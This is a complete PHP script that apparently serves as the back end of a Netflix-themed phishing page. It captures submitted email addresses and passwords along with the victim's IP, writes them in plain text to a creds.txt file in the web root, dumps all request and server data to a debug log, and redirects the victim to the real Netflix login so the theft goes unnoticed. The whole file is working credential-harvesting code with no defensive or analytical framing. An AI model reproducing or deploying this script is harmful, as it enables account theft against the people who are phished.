<?php
$logfile = "/var/www/html/debug.log";

// Initial log: script triggered
file_put_contents($logfile, "[" . date("H:i:s") . "] Script triggered\n", FILE_APPEND);

// Check if it's a POST request
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    file_put_contents($logfile, "==== POST ====\n" . print_r($_POST, true), FILE_APPEND);
    file_put_contents($logfile, "==== SERVER ====\n" . print_r($_SERVER, true), FILE_APPEND);

    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $real_ip = $_POST['real_ip'] ?? 'NOT_SET';

    $ip = $_SERVER['REMOTE_ADDR'];
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ipList = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip = trim($ipList[0]);
    }

    $time = date("Y-m-d H:i:s");
    $logEntry = "[$time] IP: $ip | RealIP: $real_ip | Email: $email | Password: $password\n";

    file_put_contents("/var/www/html/creds.txt", $logEntry, FILE_APPEND | LOCK_EX);
    file_put_contents($logfile, "[✓] Credentials written to creds.txt\n", FILE_APPEND);

    header("Location: https://www.netflix.com/login");
    exit();
} else {
    file_put_contents($logfile, "[✘] Request method not POST\n", FILE_APPEND);
    http_response_code(403);
    echo "403 Forbidden";
    exit();
}
?>
